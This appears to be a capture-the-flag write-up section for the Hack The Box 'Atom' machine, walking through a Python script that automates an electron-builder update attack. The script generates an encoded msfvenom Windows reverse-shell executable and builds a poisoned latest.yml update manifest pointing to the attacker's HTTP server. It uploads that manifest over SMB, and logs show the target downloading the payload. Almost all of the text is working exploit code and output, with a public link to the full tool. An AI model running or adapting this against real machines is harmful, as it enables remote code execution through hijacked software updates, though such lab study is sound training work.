# Automation

I did some Python scripting to make adjusting the payload easier. This was maybe more effort than it was worth, but a good learning exercise nonetheless.

## argparse

I used the `argparse` library to process command line arguments:

```python
def main():
    parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")

    #positional arguments
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("payload", help="Meterpreter payload to use")

    #named parameters/flags
    parser.add_argument("--lip", help="Local IP to listen on. Specify either this or --lint")
    parser.add_argument("--lint", help="Local interface to listen on. Specify either this or --lip")
    parser.add_argument("--lport", help="Local port to listen on. 9001 by default")

    args = parser.parse_args()

    for arg in vars(args):
        argval = getattr(args, arg)
        if argval is not None:
            print(arg + ": " + argval)

    #if args.lip is not None and args.lint is not None -  no need to check this, just take LIP first
    if args.lip is not None:
        ip = args.lip
        print("IP Address: " + ip)
    elif args.lint is not None:
        ip = get_ip(interface)
    else:
        print("You must provide one of --lip or --lint")
        sys.exit(1)
```

It now nicely handles arguments:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py --help
usage: send-payload.py [-h] [--lip LIP] [--lint LINT] [--lport LPORT] ip payload

Sends a payload to a vulnerable Electron Builder instance over SMB. Parse IP address, Port and Payload from sys args

positional arguments:
  ip             Target IP address
  payload        Meterpreter payload to use

optional arguments:
  -h, --help     show this help message and exit
  --lip LIP      Local IP to listen on. Specify either this or --lint
  --lint LINT    Local interface to listen on. Specify either this or --lip
  --lport LPORT  Local port to listen on
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py 123
usage: send-payload.py [-h] [--lip LIP] [--lint LINT] [--lport LPORT] ip payload
send-payload.py: error: the following arguments are required: payload
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py 123 payload
ip: 123
payload: payload
You must provide one of --lip or --lint
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py a.b.c.d payload --lip w.x.y.z --lint eth0 --lport 9001
ip: a.b.c.d
payload: payload
lip: w.x.y.z
lint: eth0
lport: 9001
IP Address: w.x.y.z
```

## msfvenom

I added a basic check for the serving directory:

```python
#mkdir if doesn't exist
if args.dir is not None:
	path = args.dir
	dirpath = Path(args.dir)

	if not dirpath.is_dir():
		print("Directory not found - creating directory")
		dirpath.mkdir()
```

Here we see it working:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py a p --lip i --dir to-serve
IP Address: i
Directory not found - creating directory
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ ls -la
total 252
drwxr-xr-x  9 mac mac  4096 May 28 20:18  .
drwxr-xr-x 30 mac mac  4096 May 24 20:26  ..
drwxr-xr-x  2 mac mac  4096 May 28 20:18  to-serve
```

Now we can try appending the directory to our `msfvenom` command and see what the command will look like before running it:

```python
def gen_payload(ip, port, payload, dir):
    """generate an msfvenom payload with given IP address and port"""

    cmd_str = 'msfvenom -a x86 --platform windows -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -e x86/shikata_ga_nai -f exe -o ' + dir + '"heedv1\'Setup1.0.1.exe"'

    print(cmd_str)
	
...[snip]...

def main():
    parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")

    ...[snip]...

    #parse arguments
    args = parser.parse_args()

    #default values
    path = ""
    port = "9001"
    payload = "windows/x64/shell_reverse_tcp"

    ...[snip]...

    #get port
    arg_port = args.lport
    if arg_port is not None:
        port = arg_port

    #mkdir if doesn't exist
    arg_path = args.dir
    if arg_path is not None:
        path = arg_path
        dirpath = Path(arg_path)

        if not dirpath.is_dir():
            print("Directory not found - creating directory")
            dirpath.mkdir()

    #get payload
    arg_payload = args.payload
    if arg_payload is not None:
        payload = arg_payload

    #generate shell payload
    gen_payload(ip, port, payload, path)
```

Output:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py 10.10.10.237 --lint tun0 --dir to-serve
IP Address on interface tun0: 10.10.15.4
msfvenom -a x86 --platform windows -p windows/x64/shell_reverse_tcp LHOST=10.10.15.4 LPORT=9001 -e x86/shikata_ga_nai -f exe -o to-serve"heedv1'Setup1.0.1.exe"
```

Looks good! I tried passing this command to `subprocess.run()` and spent a bit of time tweaking the syntax, before settling on using `call()` with `shell=True` instead. This passes the command to `bash` and lets it interpret the arguments instead. This worked!

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py 10.10.10.237 --lint tun0 --dir to-serve
IP Address on interface tun0: 10.10.15.4
Running command: msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.15.4 LPORT=9001 -e x86/shikata_ga_nai -f exe -o "to-serve/heedv1'Setup1.0.1.exe"
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: to-serve/heedv1'Setup1.0.1.exe
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ ls to-serve/
"heedv1'Setup1.0.1.exe"
```

## Getting Size of Payload

I initially tried using `subprocess` to get the file size, but it caused some issues with automatically escaping the `\` and `'` characters in the string (whatever combination I used).

```python
payload_path = '"' + path + 'heedv1\'Setup1.0.1.exe"'
print("Payload saved at: " + payload_path)

#get size of payload
size = subprocess.call('stat -c%s ' + payload_path)
print("Size: " + str(size))
```

I decided to use `os.path.getsize()` instead:

```python
#get size of payload
size = os.path.getsize(Path(payload_path))
print("Size: " + str(size))
```

Which seemed to work:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py --lint tun0 --dir to-serve 10.10.10.237
IP Address on interface tun0: 10.10.14.39
Running command: msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=9001 -e x86/shikata_ga_nai -f exe -o "to-serve/heedv1'Setup1.0.1.exe"
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: to-serve/heedv1'Setup1.0.1.exe
Payload saved at: to-serve/heedv1'Setup1.0.1.exe
Size: 73802
```

I verified that the output of the `stat` command is the same:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ stat -c%s "to-serve/heedv1'Setup1.0.1.exe"
73802
```

Awesome.

## Allowing Payload Reuse

I wanted to add a feature to use an existing payload rather than generating it each time. First, check the payload is provided:

```python
parser.add_argument("-p", "--payload", help="The path to an existing payload. Specify this if you don't want to generate one with msfvenom", dest="payload")

...

if args.payload is not None:
        payload_path = Path(args.payload)

        print("Payload Path: " + payload_path)
```

And generate with `msfvenom` if not:

```python
#get payload options, taking --payload as priority over --msf_payload if both provided
    if args.payload is not None:
        payload_path = Path(args.payload)

        print("Payload Path: " + payload_path)

    else:
        if args.msf_payload is not None:
            #get payload to use with msfvenom
            msf_payload = args.msf_payload

            print("Using payload " + str(msf_payload) + " with msfvenom")
        
        else:
            #default payload
            msf_payload = "windows/shell_reverse_tcp"

            print("No --msf_payload or --payload flag provided. Using default windows/shell_reverse_tcp payload and generating with msfvenom")

        #generate shell payload
        gen_payload(ip, port, msf_payload, path)

        payload_path = path + "heedv1'Setup1.0.1.exe"
        print("Payload saved at: " + payload_path)
```

Now we can run following:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py --lint tun0 --dir to-serve -p "to-serve/heedv1'Setup1.0.1.exe" 10.10.10.237
IP Address on interface tun0: 10.10.14.39
Payload Path: to-serve/heedv1'Setup1.0.1.exe
Size: 73802
```

## Hashing

I added the hashing:

```python
def gen_checksum(filepath):
    """generate a sha512 hash of the file and base64 encode it"""

    #set a buffer size to hash in chunks
    BUF_SIZE = 65536

    sha512 = hashlib.sha512()

    with open(filepath, 'rb') as f:
        while True:
            data = f.read(BUF_SIZE)
            if not data:
                break
            sha512.update(data)

    b64 = base64.b64encode(sha512.digest()).decode('utf-8')

    print("Base64-encoded SHA512-sum of payload: " + b64)

    return b64
```

And verified the SHAs are the same:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py --lint tun0 --dir to-serve -p "to-serve/heedv1'Setup1.0.1.exe" 10.10.10.237
IP Address on interface tun0: 10.10.14.39
Payload Path: to-serve/heedv1'Setup1.0.1.exe
Size: 73802
GuCsEdujwJSyKwiLFFnDCE52cmLvXVgvjE0YyOap0Siwv4GFg1dRE+6PKF7wG7+UFeGZYKHQ2lOSf74qsXd+6A==
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ shasum -a 512 "to-serve/heedv1'Setup1.0.1.exe" | cut -d " " -f1 | xxd -r -p | base64
GuCsEdujwJSyKwiLFFnDCE52cmLvXVgvjE0YyOap0Siwv4GFg1dRE+6PKF7wG7+UFeGZYKHQ2lOS
f74qsXd+6A==
```

## YAML

Putting it together in a YAML:

```python
def gen_yaml(ip, payload, size, sum, dir):

    print("\n=== Generating YAML File ===\n")

    yml_string = ("version: 1.0.1\n"
        "files:\n"
        "  url: http://{ip}/{payload}\n"
        "  sha512: {sha}\n"
        "  size: {size}\n"
        "path: {payload}\n"
        "sha512: {sha}\n"
        "releaseDate: '2021-04-21T11:17:02.627Z'"
        ).format(ip=ip, payload=payload, sha=sum, size=size)
    
    print(yml_string)

    yml_path = dir + "/latest.yml"

    with open(yml_path, 'a') as f:
        f.write(yml_string)
        f.close()

    print("YAML saved at " + yml_path)

    return yml_path
```

We can run it and show the file is saved:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 send-payload.py --lint tun0 --dir to-serve -p "to-serve/heedv1'Setup1.0.1.exe" 10.10.10.237
IP Address on interface tun0: 10.10.14.39

=== Generating Payload ===

Payload Path: to-serve/heedv1'Setup1.0.1.exe
Size: 73802
Base64-encoded SHA512-sum of payload: UboG1lEwJPbfExtL8ttp6CbfYi9nJ3mOZ8TAZzQ2ETcdq+OBXJWM/B1x6B2jEEpR8u7umo3RC5Npr15lmMjjLA==

=== Generating YAML File ===

version: 1.0.1
files:
  url: http://10.10.14.39/heedv1'Setup1.0.1.exe
  sha512: UboG1lEwJPbfExtL8ttp6CbfYi9nJ3mOZ8TAZzQ2ETcdq+OBXJWM/B1x6B2jEEpR8u7umo3RC5Npr15lmMjjLA==
  size: 73802
path: heedv1'Setup1.0.1.exe
sha512: UboG1lEwJPbfExtL8ttp6CbfYi9nJ3mOZ8TAZzQ2ETcdq+OBXJWM/B1x6B2jEEpR8u7umo3RC5Npr15lmMjjLA==
releaseDate: '2021-04-21T11:17:02.627Z'
YAML saved at to-serve/latest.yml
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ ls to-serve/
"heedv1'Setup1.0.1.exe"   latest.yml
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ cat to-serve/latest.yml 
version: 1.0.1
files:
  url: http://10.10.14.39/heedv1'Setup1.0.1.exe
  sha512: UboG1lEwJPbfExtL8ttp6CbfYi9nJ3mOZ8TAZzQ2ETcdq+OBXJWM/B1x6B2jEEpR8u7umo3RC5Npr15lmMjjLA==
  size: 73802
path: heedv1'Setup1.0.1.exe
sha512: UboG1lEwJPbfExtL8ttp6CbfYi9nJ3mOZ8TAZzQ2ETcdq+OBXJWM/B1x6B2jEEpR8u7umo3RC5Npr15lmMjjLA==
releaseDate: '2021-04-21T11:17:02.627Z'
```

## SMB

I used [this gist](https://gist.github.com/joselitosn/e74dbc2812c6479d3678) for uploading to SMB:

```python
resp = conn.storeFile('Software_Updates', 'client1/latest.yml', file)
```

Listing within the directory shows it's uploaded:

```bash
smb: \client1\> dir
  .                                   D        0  Wed Jun  2 14:22:45 2021
  ..                                  D        0  Wed Jun  2 14:22:45 2021
  latest.yml                          A     2776  Wed Jun  2 14:22:45 2021
```

Awesome - now it's automated, we just need to debug it to get it to execute code.

## Final Script Structure

This structure is working - just the payload needs adjusting:

```python
import netifaces as ni
import subprocess
import sys
import argparse
import os
from pathlib import Path
import hashlib
import base64
from smb.SMBConnection import SMBConnection

def get_ip(interface):
    """find your IP on a given interface"""
    ni.ifaddresses(interface)
    ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    print("IP Address on interface " + interface + ": " + ip)
    
    return ip

def gen_payload(ip, port, payload, dir):
    """generate an msfvenom payload with given IP address and port"""

    cmd_str = 'msfvenom -a x86 --platform windows -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -e x86/shikata_ga_nai -f exe -o "' + dir + 'heedv1\'Setup1.0.1.exe"'

    print("Running command: " + cmd_str)
    
    subprocess.call(cmd_str, shell=True)

def get_payload(args, ip, port, path):
    """generate a payload with msfvenom, calculate its size and sha512 sum
    if a payload has already been generated, just calculate its size and sha512 sum"""

    print("\n=== Generating Payload ===\n")

    payload_path = ""

    payload_name = "heedv1'Setup1.0.1.exe"

    #get payload options, taking --payload as priority over --msf_payload if both provided
    if args.payload is not None:
        payload_path = Path(args.payload)

        print("Payload Path: " + str(payload_path))

    else:
        if args.msf_payload is not None:
            #get payload to use with msfvenom
            msf_payload = args.msf_payload

            print("Using payload " + str(msf_payload) + " with msfvenom")
        
        else:
            #default payload
            msf_payload = "windows/shell_reverse_tcp"

            print("No --msf_payload or --payload flag provided. Using default windows/shell_reverse_tcp payload and generating with msfvenom")

        #generate shell payload
        gen_payload(ip, port, msf_payload, path)

        payload_path = path + payload_name
        print("Payload saved at: " + payload_path)
    
    #get size of payload
    size = os.path.getsize(Path(payload_path))
    print("Size: " + str(size))

    sum = gen_checksum(Path(payload_path))

    return payload_name, size, sum

def gen_checksum(filepath):
    """generate a sha512 hash of the file and base64 encode it"""

    #set a buffer size to hash in chunks
    BUF_SIZE = 65536

    sha512 = hashlib.sha512()

    with open(filepath, 'rb') as f:
        while True:
            data = f.read(BUF_SIZE)
            if not data:
                break
            sha512.update(data)

    b64 = base64.b64encode(sha512.digest()).decode('utf-8')

    print("Base64-encoded SHA512-sum of payload: " + b64)

    return b64

def gen_yaml(ip, payload, size, sum, dir):

    print("\n=== Generating YAML File ===\n")

    yml_string = ("version: 1.0.1\n"
        "files:\n"
        "  url: http://{ip}/{payload}\n"
        "  sha512: {sha}\n"
        "  size: {size}\n"
        "path: {payload}\n"
        "sha512: {sha}\n"
        "releaseDate: '2021-04-21T11:17:02.627Z'"
        ).format(ip=ip, payload=payload, sha=sum, size=size)
    
    print(yml_string)

    yml_path = dir + "/latest.yml"

    with open(yml_path, 'a') as f:
        f.write(yml_string)
        f.close()

    print("YAML saved at " + yml_path)

    return yml_path

def smb_upload(yml_path):

    print("\n=== Uploading to SMB ===\n")

    #set client details
    userID = "whoever"
    password = ""
    client_machine_name = "client"

    #set server details
    server_name = "ATOM" #netbios name
    server_ip = "10.10.10.237"
    domain_name = "atom.htb"

    #create and open connection
    conn = SMBConnection(userID, password, client_machine_name, server_name, domain=domain_name, use_ntlm_v2=True,
                     is_direct_tcp=True)

    conn.connect(server_ip, 445)

    #upload yml file
    with open(yml_path, 'rb') as file:
        # conn.storeFile('client1', 'latest.yml', file)
        resp = conn.storeFile('Software_Updates', 'client1/latest.yml', file)

    print(str(resp))

    conn.close()

def main():
    parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")

    #positional arguments
    parser.add_argument("ip", help="Target IP address")

    #named parameters/flags
    parser.add_argument("-p", "--payload", help="The path to an existing payload. Specify this if you don't want to generate one with msfvenom", dest="payload")
    parser.add_argument("-m", "--msf_payload", help="Msfvenom payload to use. Default is windows/x64/shell_reverse_tcp", dest="msf_payload")
    parser.add_argument("-a", "--lip", help="Local IP address to listen on. Specify either this or --lint", dest="lip")
    parser.add_argument("-i", "--lint", help="Local interface to listen on. Specify either this or --lip", dest="lint")
    parser.add_argument("-P", "--lport", help="Local port to listen on. 9001 by default", dest="lport")
    parser.add_argument("-d", "--dir", help="Directory to save payload and stand up server in", dest="dir")

    #parse arguments
    args = parser.parse_args()

    #default values
    path = ""
    port = "9001"

    #get local IP, taking --lip as priority over --lint if both provided
    if args.lip is not None:
        ip = args.lip
        print("IP Address: " + ip)
    elif args.lint is not None:
        ip = get_ip(args.lint)
    else:
        print("You must provide one of --lip or --lint. Run python3 send-payload.py -h for usage")
        sys.exit(1)

    #get port
    arg_port = args.lport
    if arg_port is not None:
        port = arg_port

    #mkdir if doesn't exist
    arg_path = args.dir
    if arg_path is not None:
        path = arg_path + "/"
        dirpath = Path(arg_path)

        if not dirpath.is_dir():
            print("Directory not found - creating directory")
            dirpath.mkdir()

    # remind user to start a listener
    # in future, start python server in a thread
    print("Make sure to start required listeners before continuing.\nRun a netcat listener to catch your shell: nc -lnvp {port}\nRun a Python Server to serve your shell in {dir}: sudo python3 -m http.server 80".format(port=port, dir=path))
    input("Press enter to continue once you've started your listeners...\n")
    
    payload_name, size, sum = get_payload(args, ip, port, path)

    yml_path = gen_yaml(ip, payload_name, size, sum, arg_path)

    smb_upload(yml_path)

if __name__ == '__main__':
    main()
```

I could get a shell manually this way by copying my friend's filename, but using `heed'setup.exe` didn't work (even after switching to the well known port 443):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom/to-serve]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.237 - - [03/Jun/2021 21:58:33] code 404, message File not found
10.10.10.237 - - [03/Jun/2021 21:58:33] "GET /heed'setup.exe.blockmap HTTP/1.1" 404 -
10.10.10.237 - - [03/Jun/2021 21:58:34] "GET /heed%27setup.exe HTTP/1.1" 200 -

┌──(mac㉿kali)-[~/Documents/HTB/atom/smb]
└─$ sudo nc -lnvp 443
listening on [any] 443 ...
```

I replaced the filename in my script to match my friend's, and it worked - so the issue wasn't with my code. When I tried the filename `h'eed` in my [[20 - Exploiting Electron Builder#Final Payload|final payload]] it worked.

The code is available [here](https://github.com/Twigonometry/CTF-Tools/blob/master/hack_the_box/atom/send-payload.py).